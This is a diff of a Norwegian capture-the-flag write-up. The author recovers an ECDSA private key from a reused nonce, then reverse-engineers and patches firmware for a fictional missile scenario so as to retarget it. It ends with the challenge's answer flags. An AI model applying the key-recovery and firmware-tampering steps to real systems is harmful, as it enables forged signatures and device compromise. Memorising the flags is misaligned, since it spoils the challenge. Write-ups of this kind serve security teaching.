@@ -717,27 +847,25 @@ Jeg prøvde å reverse engineere `signer` for å finne ut hvorfor dette skjedde,
 Lastet ned `missile.1.3.37.fw` og sammenlignet signaturen med `test.txt_signed` for å sjekke om det samme fenomenet hadde skjedd ved den tidligere signeringen:
 
 ```bash
-user@aurum:~$ tail -c 64 test.txt_signed | hd
-00000000  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
-00000010  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
-00000020  36 8b f0 ed b4 2c 04 ac  d8 64 9b aa d7 c4 fd 9b  |6....,...d......|
-00000030  23 73 db 47 3d 61 32 94  4b 80 0b 6d 7e ce 7d 16  |#s.G=a2.K..m~.}.|
+tail -c 64 test.txt_signed | hd
+# 00000000  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
+# 00000010  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
+# 00000020  36 8b f0 ed b4 2c 04 ac  d8 64 9b aa d7 c4 fd 9b  |6....,...d......|
+# 00000030  23 73 db 47 3d 61 32 94  4b 80 0b 6d 7e ce 7d 16  |#s.G=a2.K..m~.}.|
 
-user@aurum:~$ tail -c 64 missile.1.3.37.fw | hd
-00000000  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
-00000010  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
-00000020  b7 09 74 8b 70 f4 18 46  e6 32 af c7 04 f3 8d 9c  |..t.p..F.2......|
-00000030  53 fb 50 94 a3 c8 6f 2f  da 97 a7 41 3e 7a 44 90  |S.P...o/...A>zD.|
+tail -c 64 missile.1.3.37.fw | hd
+# 00000000  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
+# 00000010  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
+# 00000020  b7 09 74 8b 70 f4 18 46  e6 32 af c7 04 f3 8d 9c  |..t.p..F.2......|
+# 00000030  53 fb 50 94 a3 c8 6f 2f  da 97 a7 41 3e 7a 44 90  |S.P...o/...A>zD.|
 ```
 
 Herlig! `r`-verdiene er identiske.
 
 Brukte Python for å ekstrahere privatnøkkelen. 
-Skriptet ligger [her](crypto/same_k_recover_privkey.py). Matten er basert på [denne siden](https://asecuritysite.com/ecdsa/ecd5).
+Skriptet ligger [her](crypto/same_k_recover_privkey.py). Matten er basert på [denne siden](https://asecuritysite.com/ecdsa/ecd5):
 
-Output:
-
-```
+```C
 r1: 17211542253021086784505659283610982505828311641993563606189014132281847868803
 s1: 24672148393105490807172642003357033928250921460564351943433773766105747062038
 h1: 53558879788905805671068674208647963498387261713450127955763892603805320644988
@@ -794,7 +922,7 @@ printk("*** Booting Zephyr OS build zephyr-v3.2.0-2532-g5fab7a5173f6 ***\n");
 
 Zephyr OS er et real-time operativsystem laget for innebygde enheter, og best av alt; det er open-source. Det er en stor hjelp å kunne slå opp definisjonene på datastrukturer, funksjoner og datatyper mens man reverse-engineerer.
 
-Jeg brukte en god stund på å navigere den dekompilerte koden og å stirre på de forskjellige funksjonene til de ga noenlunde mening.
+Jeg brukte en god stund på å navigere den dekompilerte koden, og stirret i timesvis på de forskjellige funksjonene til de ga noenlunde mening.
 
 I "Memory Map"-visningen i Ghidra kan vi se et minnesegment som heter `.rocket_parameters`. 
 Innunder denne finner vi etikettene `_tof` og `_target`. Disse navnene er vi bekjent med fra missil-listen vi fikk i [2.12_missile_targets](#212_missile_targets).
@@ -839,7 +967,7 @@ Det ga følgende output:
 
 Det ser akkurat ut som target-verdiene for SUB:1 MIS:1 som dukket opp i listen over missiler! Vi er på rett spor.
 
-Jeg brukte litt tid på å lese meg opp på koordinatsystemer for å finne ut hva disse tallene betydde, og kom frem til det var ECEF (*Earth-centered, Earth-fixed*) koordinater vi jobbet med.
+Jeg brukte enda mer tid på å lese meg opp på koordinatsystemer for å finne ut hva disse tallene betydde, og kom frem til det var ECEF (*Earth-centered, Earth-fixed*) koordinater vi jobbet med.
 For å dobbeltsjekke dette prøvde jeg å konvertere fra ECEF til lat/lon ved hjelp av konvertere på nett, men de ga et resultat som virket feil.
 
 Så da spørte jeg pent ChatGPT om å lage en til meg:
@@ -859,13 +987,13 @@ def ecef_vector_to_lat_lon(vector):
     return lat, lon
 
 _target = [3965173.80, -8172.61, 4986679.35]
-print(ecef_vector_to_lat_lon(_target))
+print(*ecef_vector_to_lat_lon(_target))
 ```
 
 Output:
 
 ```python
-(51.50986495591076, -0.11809202349170798)
+51.50986495591076 -0.11809202349170798
 ```
 
 Plugger vi disse koordinatene inn i [Google Maps](https://www.google.no/maps/place/51%C2%B030'35.5%22N+0%C2%B007'05.1%22W/@51.5098683,-0.120286,17z/data=!3m1!4b1!4m5!3m4!1s0x0:0xf5e2635478a5eaeb!8m2!3d51.509865!4d-0.118092) så havner vi midt i sentrum av London. Nice! 
@@ -896,7 +1024,7 @@ _target value: d55c2495bf1d50412de5fd45fb724ec10c0e872ddee94341
 
 Planen nå var å:
 * Patche bytene i `_target` ved hjelp av "Bytes"-visningen til Ghidra
-* Lagre firmwaren og overføre den til aurum.
+* Lagre firmwaren og overføre den til `aurum`.
 * Signere filen ved å bruke `signer` og `privkey.pem`
 * Laste opp fila
 * Lage shellcode som flashet ubåt 1 med vår nye firmware
@@ -910,7 +1038,7 @@ Missilet fløy i rett retning, men traff ikke målet. Jeg tenkte at dette var p�
 
 Jeg endret da én byte i `_tof`, slik at tallverdien ble på ~69000. Dette gjorde at simuleringen brukte 10 timer, og missilet traff fortsatt ikke.
 
-Prøvde å lese meg opp på rakettforskning og hvordan tid, fart og flybanen til ballistiske missiler regnes ut, men det var komplisert. Kom frem til at beste måten å løse problemet på var å "observere" hva flytiden burde være, i stedet for å kalkulere den ut. Jeg hadde jo tross alt tilgang til dataen til 80 missiler hvor dette allerede var kalkulert.
+Prøvde å lese meg opp på rakettforskning og hvordan tid, fart og flybanen til ballistiske missiler regnes ut, men det var komplisert. Kom frem til at beste måten å løse problemet på var å "observere" hva flytiden burde være, istedenfor å kalkulere den. Jeg hadde jo tross alt tilgang til dataen til 80 missiler hvor dette allerede var kalkulert.
 
 Jeg lagde da et [lite skript](missile_scripts/missile_data_fun.py) for å regne ut distansen mellom hver ubåt og dens respektive missilers mål, i tillegg til sammenhengen mellom distanse og flytiden:
 
@@ -1023,6 +1151,38 @@ Etter gode 2 ekte timer med simulering hadde alle 5 missilene ~~truffet~~ bommet
 Kategori: 2. Oppdrag
 Oppgave:  2.16_submarine_0
 Svar:     4312ce7fbaea6a5587634a834afcb495
+Poeng:    5
+
+For mission complete må du konkatenere flaggene for 2.16 - 2.20
+```
+```text
+Kategori: 2. Oppdrag
+Oppgave:  2.17_submarine_1
+Svar:     9330f6fcf99fb2d1acdeb6e005a9477c
+Poeng:    5
+
+For mission complete må du konkatenere flaggene for 2.16 - 2.20
+```
+```text
+Kategori: 2. Oppdrag
+Oppgave:  2.18_submarine_2
+Svar:     4662c0ce7ed7d3cbb814cb60746f1d3a
+Poeng:    5
+
+For mission complete må du konkatenere flaggene for 2.16 - 2.20
+```
+```text
+Kategori: 2. Oppdrag
+Oppgave:  2.19_submarine_3
+Svar:     88ff4301442793cb1a1b8ef9c390f7a0
+Poeng:    5
+
+For mission complete må du konkatenere flaggene for 2.16 - 2.20
+```
+```text
+Kategori: 2. Oppdrag
+Oppgave:  2.20_submarine_4
+Svar:     963fd1126aa1db3a78d2bc402ee9bf91
 Poeng:    5
 
 For mission complete må du konkatenere flaggene for 2.16 - 2.20
